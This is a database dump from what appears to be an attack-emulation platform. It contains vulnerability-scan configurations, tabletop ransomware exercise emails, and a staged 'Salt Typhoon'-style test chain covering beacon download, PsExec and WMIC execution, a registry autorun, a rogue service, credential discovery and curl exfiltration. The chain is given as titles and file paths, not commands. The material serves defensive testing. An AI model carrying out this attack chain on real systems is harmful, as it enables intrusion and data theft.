9c4b2f29-61f6-4ae3-80e7-928fe4a2fc0b	2026-01-09 14:19:36.68116+00	2026-01-16 10:18:33.259764+00	"en"=>"Nuclei - Exposures", "fr"=>"Nuclei - Expositions"	f	{"contract_id": "9c4b2f29-61f6-4ae3-80e7-928fe4a2fc0b", "label": {"en": "Nuclei - Exposures", "fr": "Nuclei - Expositions"}, "fields": [{"key": "target_selector", "label": "Type of targets", "type": "select", "mandatoryGroups": [], "mandatoryConditionFields": [], "mandatoryConditionValues": [], "visibleConditionFields": [], "visibleConditionValues": [], "linkedFields": [], "mandatory": true, "readOnly": false, "cardinality": "1", "defaultValue": ["asset-groups"], "choices": {"assets": "Assets", "manual": "Manual", "asset-groups": "Asset groups"}}, {"key": "assets", "label": "Targeted assets", "type": "asset", "mandatoryGroups": [], "mandatoryConditionFields": ["target_selector"], "mandatoryConditionValues": {"target_selector": "assets"}, "visibleConditionFields": ["target_selector"], "visibleConditionValues": {"target_selector": "assets"}, "linkedFields": [], "mandatory": false, "readOnly": false, "cardinality": "n", "defaultValue": []}, {"key": "asset_groups", "label": "Targeted asset groups", "type": "asset-group", "mandatoryGroups": [], "mandatoryConditionFields": ["target_selector"], "mandatoryConditionValues": {"target_selector": "asset-groups"}, "visibleConditionFields": ["target_selector"], "visibleConditionValues": {"target_selector": "asset-groups"}, "linkedFields": [], "mandatory": false, "readOnly": false, "cardinality": "n", "defaultValue": []}, {"key": "target_property_selector", "label": "Targeted assets property", "type": "select", "mandatoryGroups": [], "mandatoryConditionFields": ["target_selector"], "mandatoryConditionValues": {"target_selector": ["assets", "asset-groups"]}, "visibleConditionFields": ["target_selector"], "visibleConditionValues": {"target_selector": ["assets", "asset-groups"]}, "linkedFields": [], "mandatory": false, "readOnly": false, "cardinality": "1", "defaultValue": ["automatic"], "choices": {"automatic": "Automatic", "hostname": "Hostname", "seen_ip": "Seen IP", "local_ip": "Local IP (first)"}}, {"key": "targets", "label": "Manual targets (comma-separated)", "type": "text", "mandatoryGroups": [], "mandatoryConditionFields": ["target_selector"], "mandatoryConditionValues": {"target_selector": "manual"}, "visibleConditionFields": ["target_selector"], "visibleConditionValues": {"target_selector": "manual"}, "linkedFields": [], "mandatory": false, "readOnly": false, "cardinality": "1", "defaultValue": ""}, {"key": "expectations", "label": "Expectations", "type": "expectation", "mandatoryGroups": [], "mandatoryConditionFields": [], "mandatoryConditionValues": [], "visibleConditionFields": [], "visibleConditionValues": [], "linkedFields": [], "mandatory": false, "readOnly": false, "cardinality": "n", "defaultValue": [], "predefinedExpectations": [{"expectation_type": "VULNERABILITY", "expectation_name": "Not vulnerable", "expectation_description": "", "expectation_score": 100, "expectation_expectation_group": false}]}, {"key": "template", "label": "Manual template path (-t)", "type": "text", "mandatoryGroups": [], "mandatoryConditionFields": [], "mandatoryConditionValues": [], "visibleConditionFields": [], "visibleConditionValues": [], "linkedFields": [], "mandatory": false, "readOnly": false, "cardinality": "1", "defaultValue": ""}], "outputs": [{"type": "cve", "field": "cve", "labels": ["nuclei"], "isFindingCompatible": true, "isMultiple": true}, {"type": "text", "field": "others", "labels": ["nuclei"], "isFindingCompatible": true, "isMultiple": true}], "config": {"type": "openaev_nuclei", "expose": true, "label": {"en": "Nuclei Scan", "fr": "Nuclei Scan"}, "color_dark": "#ff5722", "color_light": "#ff5722"}, "manual": false, "variables": [{"key": "user", "label": "User that will receive the injection", "type": "String", "cardinality": "1", "children": [{"key": "user.id", "label": "Id of the user in the platform", "type": "String", "cardinality": "1", "children": []}, {"key": "user.email", "label": "Email of the user", "type": "String", "cardinality": "1", "children": []}, {"key": "user.firstname", "label": "Firstname of the user", "type": "String", "cardinality": "1", "children": []}, {"key": "user.lastname", "label": "Lastname of the user", "type": "String", "cardinality": "1", "children": []}, {"key": "user.lang", "label": "Lang of the user", "type": "String", "cardinality": "1", "children": []}]}, {"key": "exercise", "label": "Exercise of the current injection", "type": "Object", "cardinality": "1", "children": [{"key": "exercise.id", "label": "Id of the exercise in the platform", "type": "String", "cardinality": "1", "children": []}, {"key": "exercise.name", "label": "Name of the exercise", "type": "String", "cardinality": "1", "children": []}, {"key": "exercise.description", "label": "Description of the exercise", "type": "String", "cardinality": "1", "children": []}]}, {"key": "teams", "label": "List of team name for the injection", "type": "String", "cardinality": "n", "children": []}, {"key": "player_uri", "label": "Player interface platform link", "type": "String", "cardinality": "1", "children": []}, {"key": "challenges_uri", "label": "Challenges interface platform link", "type": "String", "cardinality": "1", "children": []}, {"key": "scoreboard_uri", "label": "Scoreboard interface platform link", "type": "String", "cardinality": "1", "children": []}, {"key": "lessons_uri", "label": "Lessons learned interface platform link", "type": "String", "cardinality": "1", "children": []}], "contract_attack_patterns_external_ids": [], "contract_vulnerability_external_ids": [], "is_atomic_testing": true, "platforms": [], "external_id": null}	e1bad898-9804-427d-99e4-dc32c5f2898d	t	f	{}	f	\N	f	\N
b576c19a-3832-4294-9cb4-4da6565cc20c	2026-01-16 08:33:22.062123+00	2026-01-16 08:39:56.338874+00	"en"=>"Test - Social Engineer", "fr"=>"Test - Social Engineer"	f	{"config":{"type":"openaev_implant","expose":true,"label":{"fr":"OpenAEV Implant","en":"OpenAEV Implant"},"color_dark":"#000000","color_light":"#000000"},"label":{"fr":"Test - Social Engineer","en":"Test - Social Engineer"},"manual":false,"fields":[{"key":"assets","label":"Source assets","mandatory":false,"readOnly":false,"mandatoryGroups":["assets","asset_groups"],"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"cardinality":"n","defaultValue":[],"type":"asset"},{"key":"asset_groups","label":"Source asset groups","mandatory":false,"readOnly":false,"mandatoryGroups":["assets","asset_groups"],"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"cardinality":"n","defaultValue":[],"type":"asset-group"},{"key":"obfuscator","label":"Obfuscators","mandatory":false,"readOnly":false,"mandatoryGroups":null,"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"cardinality":"1","defaultValue":["plain-text"],"choices":[{"label":"plain-text","value":"plain-text","information":""},{"label":"base64","value":"base64","information":"CMD does not support base64 obfuscation"}],"type":"choice"},{"key":"expectations","label":"Expectations","mandatory":false,"readOnly":false,"mandatoryGroups":null,"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"cardinality":"n","defaultValue":[],"predefinedExpectations":[{"expectation_type":"PREVENTION","expectation_name":"Prevention","expectation_description":null,"expectation_score":100.0,"expectation_expectation_group":false,"expectation_expiration_time":21600},{"expectation_type":"DETECTION","expectation_name":"Detection","expectation_description":null,"expectation_score":100.0,"expectation_expectation_group":false,"expectation_expiration_time":21600}],"type":"expectation"},{"key":"message","label":"message","mandatory":true,"readOnly":false,"mandatoryGroups":null,"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"defaultValue":"Your Windows License has expired. Please contact IT Support immediately","type":"text"}],"variables":[{"key":"user","label":"User that will receive the injection","type":"String","cardinality":"1","children":[{"key":"user.id","label":"Id of the user in the platform","type":"String","cardinality":"1","children":[]},{"key":"user.email","label":"Email of the user","type":"String","cardinality":"1","children":[]},{"key":"user.firstname","label":"First name of the user","type":"String","cardinality":"1","children":[]},{"key":"user.lastname","label":"Last name of the user","type":"String","cardinality":"1","children":[]},{"key":"user.lang","label":"Language of the user","type":"String","cardinality":"1","children":[]}]},{"key":"exercise","label":"Exercise of the current injection","type":"Object","cardinality":"1","children":[{"key":"exercise.id","label":"Id of the user in the platform","type":"String","cardinality":"1","children":[]},{"key":"exercise.name","label":"Name of the exercise","type":"String","cardinality":"1","children":[]},{"key":"exercise.description","label":"Description of the exercise","type":"String","cardinality":"1","children":[]}]},{"key":"teams","label":"List of team name for the injection","type":"String","cardinality":"n","children":[]},{"key":"player_uri","label":"Player interface platform link","type":"String","cardinality":"1","children":[]},{"key":"challenges_uri","label":"Challenges interface platform link","type":"String","cardinality":"1","children":[]},{"key":"scoreboard_uri","label":"Scoreboard interface platform link","type":"String","cardinality":"1","children":[]},{"key":"lessons_uri","label":"Lessons learned interface platform link","type":"String","cardinality":"1","children":[]}],"context":{},"contract_id":"b576c19a-3832-4294-9cb4-4da6565cc20c","contract_attack_patterns_external_ids":[],"is_atomic_testing":true,"needs_executor":true,"platforms":["Windows"]}	49229430-b5b5-431f-ba5b-f36f599b0144	t	f	{Windows}	t	5b9a801b-23ef-436f-9b34-0dd38fd3c7d7	f	\N
\.


--
-- Data for Name: injectors_contracts_attack_patterns; Type: TABLE DATA; Schema: public; Owner: user
--

COPY public.injectors_contracts_attack_patterns (attack_pattern_id, injector_contract_id) FROM stdin;
cf178ab6-ddc5-4140-a47e-dab9d72607a8	521be43d-2640-4263-9894-14b53f160732
1af1d8b9-d207-43de-acdf-97f770b42388	521be43d-2640-4263-9894-14b53f160732
5a9373ec-b51b-4aa7-b2c7-d6035fa2acde	521be43d-2640-4263-9894-14b53f160732
a42a60f3-15eb-41de-9308-64b9977174b0	521be43d-2640-4263-9894-14b53f160732
93f4b270-e7b6-4c21-abfb-bfc79cfe4477	54c2ee6e-c687-46ea-9abb-fa11f92d76e4
42fcd04d-91af-4398-83fc-49bc10058bf7	54c2ee6e-c687-46ea-9abb-fa11f92d76e4
be317029-11ff-4692-9d17-53d7880134ab	e0680190-88b6-49d8-a9d4-68ba9ee49ee9
5530bf7d-e940-4266-9936-05454b05b21c	e0680190-88b6-49d8-a9d4-68ba9ee49ee9
546cb203-439a-4a43-bd1f-5143694e3245	ecaeabd1-2b14-4be7-98a1-7c70e3207ba2
c30b5c64-6636-4266-b627-915190a56423	ecaeabd1-2b14-4be7-98a1-7c70e3207ba2
dd1b8801-a3c7-4b6e-8f05-c6848bcd5521	8551e440-55e5-4122-a1e2-43fd802e7df6
1bdc2a2a-ea12-4fad-acc0-0fc6cce7272a	09a4b4ae-6848-44bd-bc75-9f9b1957edbb
6478e325-2b60-41ff-8330-09c5116d4caf	09a4b4ae-6848-44bd-bc75-9f9b1957edbb
5e4e119f-a147-4bc7-a017-d30324f70c48	8bf16b53-4ce0-46b7-8eb4-d1b56e509c8d
c6d79b29-531b-4f56-903c-a552ac852b9a	8bf16b53-4ce0-46b7-8eb4-d1b56e509c8d
217b7238-f0c4-4dc8-94af-883f9c41ee58	8bf16b53-4ce0-46b7-8eb4-d1b56e509c8d
10b4df1e-61a5-4728-96b4-29f0feecb285	457463b7-c58c-468c-91a1-debaaa65aa9a
bab4a4fd-0ca9-4f7f-911d-09b5fec78350	9f936e9e-9712-4249-ab63-c437b1a3a090
bcdfaef2-a29f-4c14-8024-b6390ac2e02f	28cbebe0-6b35-4e36-86bc-bb3d1e2c4702
29c8e3cb-e63e-4f8b-abe4-13fd13acac46	28cbebe0-6b35-4e36-86bc-bb3d1e2c4702
48226f44-f8ee-42e2-ab01-796507a3a546	28cbebe0-6b35-4e36-86bc-bb3d1e2c4702
24053ce0-1450-49f5-bb4c-56f2413fbf78	af6631b3-1ca5-4e92-bab1-d1f274ba7691
d9fcb08c-48c5-4257-a4a4-eafd63c3afd4	14abc115-80f0-4c7b-833d-64a3392806ce
\.


--
-- Data for Name: injectors_contracts_vulnerabilities; Type: TABLE DATA; Schema: public; Owner: user
--

COPY public.injectors_contracts_vulnerabilities (injector_contract_id, vulnerability_id) FROM stdin;
\.


--
-- Data for Name: injects; Type: TABLE DATA; Schema: public; Owner: user
--

COPY public.injects (inject_id, inject_user, inject_title, inject_description, inject_content, inject_all_teams, inject_enabled, inject_depends_duration, inject_depends_from_another, inject_exercise, inject_created_at, inject_updated_at, inject_country, inject_city, inject_injector_contract, inject_assets, injects_asset_groups, inject_scenario, inject_trigger_now_date, inject_collect_status) FROM stdin;
02954a34-0268-477f-9779-f98282ee9106	\N	CVE-2024-20353 - ASA Scanning		{"expectations":[{"expectation_type":"VULNERABILITY","expectation_name":"Not vulnerable","expectation_description":"","expectation_score":100,"expectation_expectation_group":false}],"target_selector":"asset-groups","target_property_selector":"local_ip","targets":"","template":"http/technologies/cisco-asa-detect.yaml"}	f	t	0	\N	\N	2026-01-09 14:19:22.879635+00	2026-01-09 14:19:22.879635+00	\N	\N	2e7fc079-4531-4444-4444-928fe4a2fc0b	\N	\N	012f1916-98c4-4124-984f-95e12b87b076	\N	\N
1c7953e3-46aa-4748-9370-7a0e2239c666	\N	CVE-2023-35078		{"expectations":[{"expectation_type":"VULNERABILITY","expectation_name":"Not vulnerable","expectation_description":"","expectation_score":100,"expectation_expectation_group":false}],"target_selector":"asset-groups","target_property_selector":"local_ip","targets":"","template":"http/cves/2023/CVE-2023-35078.yaml"}	f	t	0	\N	\N	2026-01-09 14:19:22.879635+00	2026-01-09 14:19:22.879635+00	\N	\N	2e7fc079-4444-4531-4444-928fe4a1fc0b	\N	\N	012f1916-98c4-4124-984f-95e12b87b076	\N	\N
cca5290f-7324-41ab-b891-ed747996eac9	\N	CVE-2023-48788		{"expectations":[{"expectation_type":"VULNERABILITY","expectation_name":"Not vulnerable","expectation_description":"","expectation_score":100,"expectation_expectation_group":false}],"target_selector":"asset-groups","target_property_selector":"local_ip","targets":"","template":"network/cves/2023/CVE-2023-48788.yaml"}	f	t	0	\N	\N	2026-01-09 14:19:22.879635+00	2026-01-09 14:19:22.879635+00	\N	\N	2e7fc079-4444-4531-4444-928fe4a1fc0b	\N	\N	012f1916-98c4-4124-984f-95e12b87b076	\N	\N
f7ca1396-02fe-489e-b14b-23dfad896154	\N	CVE-2023-46805		{"expectations":[{"expectation_type":"VULNERABILITY","expectation_name":"Not vulnerable","expectation_description":"","expectation_score":100,"expectation_expectation_group":false}],"target_selector":"asset-groups","target_property_selector":"local_ip","targets":"","template":"http/cves/2023/CVE-2023-46805.yaml"}	f	t	0	\N	\N	2026-01-09 14:19:22.879635+00	2026-01-09 14:19:22.879635+00	\N	\N	2e7fc079-4444-4531-4444-928fe4a1fc0b	\N	\N	012f1916-98c4-4124-984f-95e12b87b076	\N	\N
e5074fad-0d61-469c-af79-d269e87ae7b8	\N	CVE-2021-26855		{"expectations":[{"expectation_type":"VULNERABILITY","expectation_name":"Not vulnerable","expectation_description":"","expectation_score":100,"expectation_expectation_group":false}],"target_selector":"asset-groups","target_property_selector":"local_ip","targets":"","template":"http/cves/2021/CVE-2021-26855.yaml"}	f	t	0	\N	\N	2026-01-09 14:19:22.879635+00	2026-01-09 14:19:22.879635+00	\N	\N	2e7fc079-4444-4531-4444-928fe4a1fc0b	\N	\N	012f1916-98c4-4124-984f-95e12b87b076	\N	\N
a5d9f328-e2fe-4e7b-a1ed-d9df3e82ede9	\N	CVE-2023-20198		{"expectations":[{"expectation_type":"VULNERABILITY","expectation_name":"Not vulnerable","expectation_description":"","expectation_score":100,"expectation_expectation_group":false}],"target_selector":"asset-groups","target_property_selector":"local_ip","targets":"","template":"http/cves/2023/CVE-2023-20198.yaml"}	f	t	0	\N	\N	2026-01-09 14:19:22.879635+00	2026-01-09 14:19:22.879635+00	\N	\N	2e7fc079-4444-4531-4444-928fe4a1fc0b	\N	\N	012f1916-98c4-4124-984f-95e12b87b076	\N	\N
3d6b39cc-941e-4206-a8dc-d74d00193e19	\N	Download beacon to target with some masquerading - Salt Typhoon Style	\N	{"expectations":[{"expectation_type":"PREVENTION","expectation_name":"Prevention","expectation_description":null,"expectation_score":100,"expectation_expectation_group":false,"expectation_expiration_time":21600},{"expectation_type":"DETECTION","expectation_name":"Detection","expectation_description":null,"expectation_score":100,"expectation_expectation_group":false,"expectation_expiration_time":21600}],"obfuscator":"plain-text"}	f	t	120	\N	\N	2026-01-09 14:19:22.879635+00	2026-01-09 14:19:22.879635+00	\N	\N	521be43d-2640-4263-9894-14b53f160732	\N	\N	012f1916-98c4-4124-984f-95e12b87b076	\N	\N
d62f4a25-62c9-418f-b029-dedfcebad7a6	\N	Deploy cab file containing beacon to target - Salt Typhoon Style	\N	{"expectations":[{"expectation_type":"PREVENTION","expectation_name":"Prevention","expectation_description":null,"expectation_score":100,"expectation_expectation_group":false,"expectation_expiration_time":21600},{"expectation_type":"DETECTION","expectation_name":"Detection","expectation_description":null,"expectation_score":100,"expectation_expectation_group":false,"expectation_expiration_time":21600}],"obfuscator":"plain-text"}	f	t	180	\N	\N	2026-01-09 14:19:22.879635+00	2026-01-09 14:19:22.879635+00	\N	\N	54c2ee6e-c687-46ea-9abb-fa11f92d76e4	\N	\N	012f1916-98c4-4124-984f-95e12b87b076	\N	\N
ffa4da5c-aab3-4785-8aa2-7873d9b158b2	\N	Copy beacon cab file to remote target with some masquerading - Salt Typhoon	\N	{"expectations":[{"expectation_type":"PREVENTION","expectation_name":"Prevention","expectation_description":null,"expectation_score":100,"expectation_expectation_group":false,"expectation_expiration_time":21600},{"expectation_type":"DETECTION","expectation_name":"Detection","expectation_description":null,"expectation_score":100,"expectation_expectation_group":false,"expectation_expiration_time":21600}],"obfuscator":"plain-text","HOSTNAME":"127.0.0.1"}	f	t	240	\N	\N	2026-01-09 14:19:22.879635+00	2026-01-09 14:19:22.879635+00	\N	\N	e0680190-88b6-49d8-a9d4-68ba9ee49ee9	\N	\N	012f1916-98c4-4124-984f-95e12b87b076	\N	\N
ff1643e4-e8f8-4c40-bf3e-0d819c02be92	\N	Expand cab file to remote target with some masquerading - Salt Typhoon	\N	{"expectations":[{"expectation_type":"PREVENTION","expectation_name":"Prevention","expectation_description":null,"expectation_score":100,"expectation_expectation_group":false,"expectation_expiration_time":21600},{"expectation_type":"DETECTION","expectation_name":"Detection","expectation_description":null,"expectation_score":100,"expectation_expectation_group":false,"expectation_expiration_time":21600}],"obfuscator":"plain-text","HOSTNAME":"127.0.0.1"}	f	t	300	\N	\N	2026-01-09 14:19:22.879635+00	2026-01-09 14:19:22.879635+00	\N	\N	ecaeabd1-2b14-4be7-98a1-7c70e3207ba2	\N	\N	012f1916-98c4-4124-984f-95e12b87b076	\N	\N
a870742e-000e-4eec-9ef7-526b8a68cdd1	\N	Execute a remote BAT Script via PSExec - Salt Typhoon	\N	{"expectations":[{"expectation_type":"PREVENTION","expectation_name":"Prevention","expectation_description":null,"expectation_score":100,"expectation_expectation_group":false,"expectation_expiration_time":21600},{"expectation_type":"DETECTION","expectation_name":"Detection","expectation_description":null,"expectation_score":100,"expectation_expectation_group":false,"expectation_expiration_time":21600}],"obfuscator":"plain-text","IP":"127.0.0.1","psexec_binary\\t":"C:\\\\Windows\\\\Temp\\\\PsTools\\\\PsExec64.exe","psexec_path\\t":"c:\\\\windows\\\\temp","file":"c:\\\\programdata\\\\microsoft\\\\drm\\\\182.bat"}	f	t	360	\N	\N	2026-01-09 14:19:22.879635+00	2026-01-09 14:19:22.879635+00	\N	\N	8551e440-55e5-4122-a1e2-43fd802e7df6	\N	\N	012f1916-98c4-4124-984f-95e12b87b076	\N	\N
2171ccb6-84db-4ca5-bbcf-9e4735f9f9aa	\N	Enumerate Local and Remote System Info - Salt Typhoon	\N	{"expectations":[{"expectation_type":"DETECTION","expectation_name":"Detection","expectation_description":null,"expectation_score":100,"expectation_expectation_group":false,"expectation_expiration_time":21600},{"expectation_type":"PREVENTION","expectation_name":"Prevention","expectation_description":null,"expectation_score":100,"expectation_expectation_group":false,"expectation_expiration_time":21600}],"obfuscator":"plain-text"}	f	t	420	\N	\N	2026-01-09 14:19:22.879635+00	2026-01-09 14:19:22.879635+00	\N	\N	09a4b4ae-6848-44bd-bc75-9f9b1957edbb	\N	\N	012f1916-98c4-4124-984f-95e12b87b076	\N	\N
73eac52e-6a09-4722-91a8-921c150c2557	\N	BAT script execution with WMIC - Salt Typhoon	\N	{"expectations":[{"expectation_type":"PREVENTION","expectation_name":"Prevention","expectation_description":null,"expectation_score":100,"expectation_expectation_group":false,"expectation_expiration_time":21600},{"expectation_type":"DETECTION","expectation_name":"Detection","expectation_description":null,"expectation_score":100,"expectation_expectation_group":false,"expectation_expiration_time":21600}],"obfuscator":"plain-text","file":"c:\\\\programdata\\\\microsoft\\\\drm\\\\182.bat"}	f	t	480	\N	\N	2026-01-09 14:19:22.879635+00	2026-01-09 14:19:22.879635+00	\N	\N	8bf16b53-4ce0-46b7-8eb4-d1b56e509c8d	\N	\N	012f1916-98c4-4124-984f-95e12b87b076	\N	\N
1856b7ed-a5ea-4b16-a121-82f4891623d9	\N	Create a new Registry Key for Autorun of cmd.exe - Salt Typhoon	\N	{"expectations":[{"expectation_type":"PREVENTION","expectation_name":"Prevention","expectation_description":null,"expectation_score":100,"expectation_expectation_group":false,"expectation_expiration_time":21600},{"expectation_type":"DETECTION","expectation_name":"Detection","expectation_description":null,"expectation_score":100,"expectation_expectation_group":false,"expectation_expiration_time":21600}],"obfuscator":"plain-text"}	f	t	540	\N	\N	2026-01-09 14:19:22.879635+00	2026-01-09 14:19:22.879635+00	\N	\N	457463b7-c58c-468c-91a1-debaaa65aa9a	\N	\N	012f1916-98c4-4124-984f-95e12b87b076	\N	\N
9557f435-721d-4dc0-9c65-af5b94a8deb9	\N	Create a New Service "Crowdoor" - Salt Typhoon	\N	{"expectations":[{"expectation_type":"PREVENTION","expectation_name":"Prevention","expectation_description":null,"expectation_score":100,"expectation_expectation_group":false,"expectation_expiration_time":21600},{"expectation_type":"DETECTION","expectation_name":"Detection","expectation_description":null,"expectation_score":100,"expectation_expectation_group":false,"expectation_expiration_time":21600}],"obfuscator":"plain-text"}	f	t	600	\N	\N	2026-01-09 14:19:22.879635+00	2026-01-09 14:19:22.879635+00	\N	\N	9f936e9e-9712-4249-ab63-c437b1a3a090	\N	\N	012f1916-98c4-4124-984f-95e12b87b076	\N	\N
f7b3e824-6578-44bf-915b-4dba8cd1fad1	\N	TrillClient’s user credential discovery - Salt Typhoon	\N	{"expectations":[{"expectation_type":"PREVENTION","expectation_name":"Prevention","expectation_description":null,"expectation_score":100,"expectation_expectation_group":false,"expectation_expiration_time":21600},{"expectation_type":"DETECTION","expectation_name":"Detection","expectation_description":null,"expectation_score":100,"expectation_expectation_group":false,"expectation_expiration_time":21600}],"obfuscator":"plain-text"}	f	t	660	\N	\N	2026-01-09 14:19:22.879635+00	2026-01-09 14:19:22.879635+00	\N	\N	28cbebe0-6b35-4e36-86bc-bb3d1e2c4702	\N	\N	012f1916-98c4-4124-984f-95e12b87b076	\N	\N
761d24c8-908b-48b6-a962-5ffdeadce9bc	\N	Exfiltrate data HTTPS using curl windows	\N	{"expectations":[{"expectation_type":"PREVENTION","expectation_name":"Prevention","expectation_description":null,"expectation_score":100,"expectation_expectation_group":false,"expectation_expiration_time":21600},{"expectation_type":"DETECTION","expectation_name":"Detection","expectation_description":null,"expectation_score":100,"expectation_expectation_group":false,"expectation_expiration_time":21600}],"obfuscator":"plain-text","input_file":"c:\\\\windows\\\\ime\\\\out3.tmp","curl_path":"C:\\\\windows\\\\temp\\\\curl\\\\curl-8.4.0_6-win64-mingw\\\\bin\\\\curl.exe"}	f	t	720	\N	\N	2026-01-09 14:19:22.879635+00	2026-01-09 14:19:22.879635+00	\N	\N	af6631b3-1ca5-4e92-bab1-d1f274ba7691	\N	\N	012f1916-98c4-4124-984f-95e12b87b076	\N	\N
560916d1-a33b-4b9e-bc7d-af71584818c1	\N	Cleanup artifacts	\N	{"expectations":[{"expectation_type":"PREVENTION","expectation_name":"Prevention","expectation_description":null,"expectation_score":100,"expectation_expectation_group":false,"expectation_expiration_time":21600},{"expectation_type":"DETECTION","expectation_name":"Detection","expectation_description":null,"expectation_score":100,"expectation_expectation_group":false,"expectation_expiration_time":21600}],"obfuscator":"plain-text"}	f	t	720	\N	\N	2026-01-09 14:19:22.879635+00	2026-01-09 14:19:22.879635+00	\N	\N	14abc115-80f0-4c7b-833d-64a3392806ce	\N	\N	012f1916-98c4-4124-984f-95e12b87b076	\N	\N
a91ac99b-7434-42dd-a00c-95f05300aa10	\N	Nuclei - Misconfigurations		{"expectations":[{"expectation_type":"VULNERABILITY","expectation_name":"Not vulnerable","expectation_description":"","expectation_score":100,"expectation_expectation_group":false}],"target_selector":"asset-groups","target_property_selector":"hostname","targets":"","template":""}	f	t	0	\N	\N	2026-01-09 14:19:22.879635+00	2026-01-09 14:19:22.879635+00	\N	\N	a4eb02bd-3c9f-4a97-b9a1-54a9b7a7f21e	\N	\N	e21fc071-023e-42cb-8e64-cc56774d0282	\N	\N
7ad5ab25-d274-4afe-a4ce-d182459ea5af	\N	Nuclei - CVE Scan		{"expectations":[{"expectation_type":"VULNERABILITY","expectation_name":"Not vulnerable","expectation_description":"","expectation_score":100,"expectation_expectation_group":false}],"target_selector":"asset-groups","target_property_selector":"hostname","targets":"","template":""}	f	t	0	\N	\N	2026-01-09 14:19:22.879635+00	2026-01-09 14:19:22.879635+00	\N	\N	2e7fc079-4444-4531-4444-928fe4a1fc0b	\N	\N	e21fc071-023e-42cb-8e64-cc56774d0282	\N	\N
7ffd85f3-c962-4aed-9b1c-d39c4feedeb2	\N	Nmap - TCP Connect Scan		{"expectations":[{"expectation_type":"DETECTION","expectation_name":"Detection","expectation_description":"","expectation_score":100,"expectation_expectation_group":false}],"target_selector":"asset-groups","target_property_selector":"hostname","targets":""}	f	t	0	\N	\N	2026-01-09 14:19:22.879635+00	2026-01-09 14:19:22.879635+00	\N	\N	93d27459-68d0-43b1-ad65-eacc3cfa5cf7	\N	\N	e21fc071-023e-42cb-8e64-cc56774d0282	\N	\N
b74fecbf-ec88-4c8c-a842-a5f71f4a1f27	\N	Nuclei - Exposures		{"expectations":[{"expectation_type":"VULNERABILITY","expectation_name":"Not vulnerable","expectation_description":"","expectation_score":100,"expectation_expectation_group":false}],"target_selector":"asset-groups","target_property_selector":"hostname","targets":"","template":""}	f	t	0	\N	\N	2026-01-09 14:19:22.879635+00	2026-01-09 14:19:22.879635+00	\N	\N	9c4b2f29-61f6-4ae3-80e7-928fe4a2fc0b	\N	\N	e21fc071-023e-42cb-8e64-cc56774d0282	\N	\N
5c493a6e-e47a-48fc-9899-cb28c2348c15	\N	Nuclei - Panel Scan		{"expectations":[{"expectation_type":"VULNERABILITY","expectation_name":"Not vulnerable","expectation_description":"","expectation_score":100,"expectation_expectation_group":false}],"target_selector":"asset-groups","target_property_selector":"hostname","targets":"","template":""}	f	t	0	\N	\N	2026-01-09 14:19:22.879635+00	2026-01-09 14:19:22.879635+00	\N	\N	3cf1b7a6-39d2-4531-8c8e-2b7c67470d1e	\N	\N	e21fc071-023e-42cb-8e64-cc56774d0282	\N	\N
56570507-8736-4dc8-9729-244697d1b913	\N	14 - Task Assignment: Recovery Planning & Data Restoration Assessment	\N	{"body":"<p>Sender: Head of IT<br><br>${recovery_team_lead_name},&nbsp;</p><p>Please begin developing a comprehensive recovery plan. This includes assessing the feasibility of data restoration from backups, identifying critical systems for priority recovery, and coordinating with the forensic investigation team.</p>","subject":"Task Assignment: Recovery Planning & Data Restoration Assessment","expectations":[{"expectation_description":"Recovery Planning: Start outlining the steps required to restore systems and data, considering various recovery options.","expectation_name":"Recovery Planning","expectation_score":100,"expectation_type":"MANUAL","expectation_expectation_group":false}]}	t	t	12600	\N	\N	2026-01-09 14:19:22.879635+00	2026-01-09 14:19:22.879635+00	\N	\N	2790bd39-37d4-4e39-be7e-53f3ca783f86	\N	\N	a0672cc6-82fb-4552-9e7e-6993457ef415	\N	\N
4513e478-bb87-46c4-bde4-6d6bfec0ff8a	\N	7 - Internal Announcement: IT Security Incident	\N	{"body":"<p>Sender: Head of Communications</p><p><br>Dear Employees,&nbsp;</p><p>We are currently investigating a potential IT security incident that may cause some temporary disruptions to our systems. Our IT teams are working diligently to resolve the issue and restore normal operations as quickly as possible. We will provide further updates as they become available. Please do not attempt to access any suspicious links or files.</p>","subject":"Internal Announcement: IT Security Incident","expectations":[{"expectation_description":"Internal Transparency & Guidance: Inform employees about the incident, acknowledge potential disruptions, and provide basic security advice. Avoid speculation.","expectation_name":"Internal Transparency & Guidance","expectation_score":100,"expectation_type":"MANUAL","expectation_expectation_group":false}]}	t	t	5400	\N	\N	2026-01-09 14:19:22.879635+00	2026-01-09 14:19:22.879635+00	\N	\N	2790bd39-37d4-4e39-be7e-53f3ca783f86	\N	\N	a0672cc6-82fb-4552-9e7e-6993457ef415	\N	\N
090b448a-e5b0-440e-b8d5-86c505813bcd	\N	15 - Preliminary Findings: Akira Ransomware - Tactics & Potential Data Exfiltration	\N	{"body":"<p>Sender: Forensic Investigation Lead<br><br>Dear Team,&nbsp;</p><p>Our initial analysis confirms the presence of Akira ransomware. We have identified the likely entry vector as [Specific Vulnerability/Method]. There is also evidence suggesting potential data exfiltration prior to encryption. We are continuing our analysis to determine the extent and nature of the compromised data.</p>","subject":"Preliminary Findings: Akira Ransomware - Tactics & Potential Data Exfiltration","expectations":[{"expectation_description":"Detailed Threat Analysis: Provide insights into the attacker's methods and the potential for data breach, informing legal and recovery efforts.","expectation_name":"Detailed Threat Analysis","expectation_score":100,"expectation_type":"MANUAL","expectation_expectation_group":false}]}	t	t	13500	\N	\N	2026-01-09 14:19:22.879635+00	2026-01-09 14:19:22.879635+00	\N	\N	2790bd39-37d4-4e39-be7e-53f3ca783f86	\N	\N	a0672cc6-82fb-4552-9e7e-6993457ef415	\N	\N
